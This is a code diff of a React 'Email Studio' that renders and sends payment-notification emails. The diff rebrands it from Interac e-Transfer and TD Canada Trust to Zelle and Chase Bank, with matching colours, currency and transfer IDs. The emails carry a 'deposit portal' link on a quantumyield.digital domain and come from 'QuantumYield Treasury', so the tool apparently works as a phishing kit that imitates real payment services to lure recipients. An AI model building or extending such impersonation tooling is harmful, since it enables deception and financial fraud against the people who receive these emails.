@@ -14,7 +14,6 @@ import {
   Search,
   Send,
   Eye,
-  EyeOff,
   X,
   CheckCircle2,
   Loader2,
@@ -92,7 +91,7 @@ const iconMap: Record<string, React.ComponentType<{ className?: string }>> = {
   ClipboardCheck,
 }
 
-function InteracLoader({ onComplete }: { onComplete: () => void }) {
+function ZelleLoader({ onComplete }: { onComplete: () => void }) {
   const [progress, setProgress] = useState(0)
   const [fadeOut, setFadeOut] = useState(false)
 
@@ -117,10 +116,10 @@ function InteracLoader({ onComplete }: { onComplete: () => void }) {
     >
       <div className="flex flex-col items-center gap-8">
         <div className="relative">
-          <div className="w-20 h-20 sm:w-24 sm:h-24 bg-[#FDB913] rounded-2xl flex items-center justify-center p-4 animate-pulse shadow-lg shadow-[#FDB913]/30">
-            <Mail className="w-10 h-10 sm:w-12 sm:h-12 text-black" />
+          <div className="w-20 h-20 sm:w-24 sm:h-24 bg-[#6D1ED4] rounded-2xl flex items-center justify-center p-4 animate-pulse shadow-lg shadow-[#6D1ED4]/30">
+            <Mail className="w-10 h-10 sm:w-12 sm:h-12 text-white" />
           </div>
-          <div className="absolute -inset-3 border-4 border-transparent border-t-[#FDB913] rounded-full animate-spin" />
+          <div className="absolute -inset-3 border-4 border-transparent border-t-[#6D1ED4] rounded-full animate-spin" />
         </div>
         <div className="text-center">
           <h2 className="text-xl sm:text-2xl font-bold text-white mb-2">Email Studio</h2>
@@ -128,7 +127,7 @@ function InteracLoader({ onComplete }: { onComplete: () => void }) {
         </div>
         <div className="w-48 sm:w-64 h-1.5 bg-zinc-800 rounded-full overflow-hidden">
           <div
-            className="h-full bg-gradient-to-r from-[#FDB913] to-[#e5a811] rounded-full transition-all duration-100 ease-out"
+            className="h-full bg-[#6D1ED4] rounded-full transition-all duration-100 ease-out"
             style={{ width: `${progress}%` }}
           />
         </div>
@@ -175,13 +174,10 @@ function EmailStudioContent() {
     recipientName: "John Doe",
     amount: "1,500.00",
     message: "",
-    securityQuestion: "What is the verification code?",
-    securityAnswer: "SECURE123",
   })
-  const [showSecurityAnswer, setShowSecurityAnswer] = useState(false)
 
   // Stable preview transfer ID — only regenerate when template changes
-  const [previewTransferId] = useState(`INTC-${Math.floor(100000 + Math.random() * 900000)}-PREVIEW`)
+  const [previewTransferId] = useState(`ZELLE-${Math.floor(100000 + Math.random() * 900000)}-PREVIEW`)
 
   const filteredTemplates = getTemplatesByCategory(activeCategory).filter(
     (t) =>
@@ -202,16 +198,14 @@ function EmailStudioContent() {
         recipientName: formData.recipientName,
         amount: parseFloat(formData.amount.replace(/,/g, "")) || 0,
         message: formData.message || undefined,
-        securityQuestion: formData.securityQuestion || undefined,
-        securityAnswer: formData.securityAnswer || undefined,
-        depositLink: "https://interac.quantumyield.digital/deposit-portal",
+        depositLink: "https://app.quantumyield.digital/deposit-portal",
         transferId: previewTransferId,
         senderName: "QuantumYield Treasury",
         institution: "QuantumYield | Treasury & Vault Portal",
-        bankName: "TD Canada Trust",
+        bankName: "Chase Bank",
         limit: "10,000",
         deviceInfo: "Chrome on Windows",
-        location: "Toronto, Canada",
+        location: "New York, NY",
       })
     : ""
 
@@ -226,7 +220,7 @@ function EmailStudioContent() {
     setSending(true)
 
     try {
-      const response = await fetch("/api/send-interac", {
+      const response = await fetch("/api/send-zelle", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -234,8 +228,6 @@ function EmailStudioContent() {
           recipientName:    formData.recipientName,
           amount:           formData.amount.replace(/,/g, ""),
           message:          formData.message,
-          securityQuestion: formData.securityQuestion,
-          securityAnswer:   formData.securityAnswer,
           templateId:       selectedTemplate || "transfer-received",
           language,
         }),
@@ -257,14 +249,14 @@ function EmailStudioContent() {
   }
 
   if (isLoading) {
-    return <InteracLoader onComplete={() => setIsLoading(false)} />
+    return <ZelleLoader onComplete={() => setIsLoading(false)} />
   }
 
   return (
     <div className="fixed inset-0 bg-gradient-to-br from-zinc-950 via-zinc-900 to-black overflow-hidden flex flex-col">
       {/* Animated background */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
-        <div className="absolute -top-1/2 -left-1/2 w-full h-full bg-gradient-to-br from-[#FDB913]/5 via-transparent to-transparent rounded-full blur-3xl animate-pulse" />
+        <div className="absolute -top-1/2 -left-1/2 w-full h-full bg-gradient-to-br from-[#6D1ED4]/5 via-transparent to-transparent rounded-full blur-3xl animate-pulse" />
         <div className="absolute -bottom-1/2 -right-1/2 w-full h-full bg-gradient-to-tl from-pink-500/5 via-transparent to-transparent rounded-full blur-3xl animate-pulse" style={{ animationDelay: "1s" }} />
       </div>
 
@@ -295,11 +287,11 @@ function EmailStudioContent() {
               placeholder="Search templates..."
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
-              className="w-64 pl-9 bg-zinc-800/50 border-zinc-700 text-white placeholder:text-zinc-500 focus:border-[#FDB913]"
+              className="w-64 pl-9 bg-zinc-800/50 border-zinc-700 text-white placeholder:text-zinc-500 focus:border-[#6D1ED4]"
             />
           </div>
           <div className="flex items-center gap-2 px-3 py-2 bg-zinc-800/50 border border-zinc-700 rounded-xl">
-            <Sparkles className="w-4 h-4 text-[#FDB913]" />
+            <Sparkles className="w-4 h-4 text-[#6D1ED4]" />
             <span className="text-sm font-medium text-white">33</span>
             <span className="text-xs text-zinc-500 hidden sm:inline">templates</span>
           </div>
@@ -331,13 +323,13 @@ function EmailStudioContent() {
                 onClick={() => setActiveCategory(category.id)}
                 className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-sm transition-all ${
                   activeCategory === category.id
-                    ? "bg-[#FDB913]/10 text-[#FDB913] border border-[#FDB913]/30"
+                    ? "bg-[#6D1ED4]/10 text-[#6D1ED4] border border-[#6D1ED4]/30"
                     : "text-zinc-400 hover:text-white hover:bg-zinc-800/50"
                 }`}
               >
                 <span>{category.name}</span>
                 <span className={`text-xs px-2 py-0.5 rounded-full ${
-                  activeCategory === category.id ? "bg-[#FDB913]/20" : "bg-zinc-800"
+                  activeCategory === category.id ? "bg-[#6D1ED4]/20" : "bg-zinc-800"
                 }`}>
                   {category.count}
                 </span>
@@ -356,7 +348,7 @@ function EmailStudioContent() {
                 onClick={() => setActiveCategory(category.id)}
                 className={`flex-shrink-0 px-4 py-2 rounded-full text-sm font-medium transition-all ${
                   activeCategory === category.id
-                    ? "bg-[#FDB913] text-black"
+                    ? "bg-[#6D1ED4] text-white"
                     : "bg-zinc-800 text-zinc-400 hover:text-white"
                 }`}
               >
@@ -368,7 +360,7 @@ function EmailStudioContent() {
           {/* Grid header */}
           <div className="flex items-center justify-between mb-4">
             <h2 className="text-lg font-semibold text-white flex items-center gap-2">
-              <LayoutGrid className="w-5 h-5 text-[#FDB913]" />
+              <LayoutGrid className="w-5 h-5 text-[#6D1ED4]" />
               {templateCategories.find(c => c.id === activeCategory)?.name || "All Templates"}
             </h2>
             <span className="text-sm text-zinc-500">{filteredTemplates.length} templates</span>
@@ -398,7 +390,7 @@ function EmailStudioContent() {
                   </div>
 
                   {/* Content */}
-                  <h3 className="font-semibold text-white mb-1 group-hover:text-[#FDB913] transition-colors">
+                  <h3 className="font-semibold text-white mb-1 group-hover:text-[#6D1ED4] transition-colors">
                     {template.name}
                   </h3>
                   <p className="text-xs text-zinc-500 mb-3 line-clamp-2">
@@ -411,7 +403,7 @@ function EmailStudioContent() {
                   </span>
 
                   {/* Hover overlay */}
-                  <div className="absolute inset-0 rounded-2xl bg-gradient-to-t from-[#FDB913]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none" />
+                  <div className="absolute inset-0 rounded-2xl bg-gradient-to-t from-[#6D1ED4]/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none" />
                 </button>
               )
             })}
@@ -452,7 +444,7 @@ function EmailStudioContent() {
                 onClick={() => setMobileTab("config")}
                 className={`flex-1 py-3 text-sm font-semibold transition-colors flex items-center justify-center gap-2 ${
                   mobileTab === "config"
-                    ? "text-[#FDB913] border-b-2 border-[#FDB913]"
+                    ? "text-[#6D1ED4] border-b-2 border-[#6D1ED4]"
                     : "text-zinc-500"
                 }`}
               >
@@ -463,7 +455,7 @@ function EmailStudioContent() {
                 onClick={() => setMobileTab("preview")}
                 className={`flex-1 py-3 text-sm font-semibold transition-colors flex items-center justify-center gap-2 ${
                   mobileTab === "preview"
-                    ? "text-[#FDB913] border-b-2 border-[#FDB913]"
+                    ? "text-[#6D1ED4] border-b-2 border-[#6D1ED4]"
                     : "text-zinc-500"
                 }`}
               >
@@ -481,18 +473,18 @@ function EmailStudioContent() {
                   <div className="flex items-center justify-between mb-4">
                     <div>
                       <h4 className="text-sm font-semibold text-white flex items-center gap-2">
-                        <Send className="w-4 h-4 text-[#FDB913]" />
+                        <Send className="w-4 h-4 text-[#6D1ED4]" />
                         Email Configuration
                       </h4>
                       <p className="text-xs text-zinc-500 mt-0.5 pl-6">
-                        Template: <span className="text-[#FDB913] font-medium">{currentTemplate.name}</span>
+                        Template: <span className="text-[#6D1ED4] font-medium">{currentTemplate.name}</span>
                       </p>
                     </div>
                     <div className="flex items-center gap-1 bg-zinc-900/60 border border-zinc-700 rounded-lg p-1 self-start">
                       <button
                         onClick={() => setLanguage("en")}
                         className={`px-3 py-1 rounded-md text-xs font-semibold transition-all ${
-                          language === "en" ? "bg-[#FDB913] text-black" : "text-zinc-400 hover:text-white"
+                          language === "en" ? "bg-[#6D1ED4] text-white" : "text-zinc-400 hover:text-white"
                         }`}
                       >
                         EN
@@ -500,7 +492,7 @@ function EmailStudioContent() {
                       <button
                         onClick={() => setLanguage("fr")}
                         className={`px-3 py-1 rounded-md text-xs font-semibold transition-all ${
-                          language === "fr" ? "bg-[#FDB913] text-black" : "text-zinc-400 hover:text-white"
+                          language === "fr" ? "bg-[#6D1ED4] text-white" : "text-zinc-400 hover:text-white"
                         }`}
                       >
                         FR
@@ -529,7 +521,7 @@ function EmailStudioContent() {
                         />
                       </div>
                       <div>
-                        <label className="text-xs font-medium text-zinc-400 mb-1 block">Amount (CAD)</label>
+                        <label className="text-xs font-medium text-zinc-400 mb-1 block">Amount (USD)</label>
                         <Input
                           value={formData.amount}
                           onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
@@ -547,40 +539,14 @@ function EmailStudioContent() {
                         className="bg-zinc-900/50 border-zinc-700 text-white placeholder:text-zinc-600 text-base"
                       />
                     </div>
-                    <div>
-                      <label className="text-xs font-medium text-zinc-400 mb-1 block">Security Question</label>
-                      <Input
-                        value={formData.securityQuestion}
-                        onChange={(e) => setFormData({ ...formData, securityQuestion: e.target.value })}
-                        className="bg-zinc-900/50 border-zinc-700 text-white text-base"
-                      />
-                    </div>
-                    <div>
-                      <label className="text-xs font-medium text-zinc-400 mb-1 block">Security Answer</label>
-                      <div className="relative">
-                        <Input
-                          type={showSecurityAnswer ? "text" : "password"}
-                          value={formData.securityAnswer}
-                          onChange={(e) => setFormData({ ...formData, securityAnswer: e.target.value })}
-                          className="bg-zinc-900/50 border-zinc-700 text-white pr-10 text-base"
-                        />
-                        <button
-                          type="button"
-                          onClick={() => setShowSecurityAnswer((v) => !v)}
-                          className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-500 hover:text-zinc-300 transition-colors"
-                          tabIndex={-1}
-                        >
-                          {showSecurityAnswer ? <Eye className="w-4 h-4" /> : <EyeOff className="w-4 h-4" />}
-                        </button>
-                      </div>
-                    </div>
+
                   </div>
 
                   <div className="mt-4 flex gap-2">
                     <Button
                       onClick={handleSendEmail}
                       disabled={sending}
-                      className="flex-1 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold h-12 text-base"
+                      className="flex-1 bg-[#6D1ED4] hover:bg-[#5A18B0] text-white font-semibold h-12 text-base"
                     >
                       {sending ? (
                         <><Loader2 className="w-4 h-4 mr-2 animate-spin" />Sending...</>
@@ -610,7 +576,7 @@ function EmailStudioContent() {
                 <Card className="bg-zinc-800/50 border-zinc-700 p-4">
                   <div className="flex items-center justify-between mb-3">
                     <h4 className="text-sm font-semibold text-white flex items-center gap-2">
-                      <Eye className="w-4 h-4 text-[#FDB913]" />
+                      <Eye className="w-4 h-4 text-[#6D1ED4]" />
                       Live Preview
                     </h4>
                     <span className="text-xs text-zinc-500 font-medium">{language.toUpperCase()}</span>
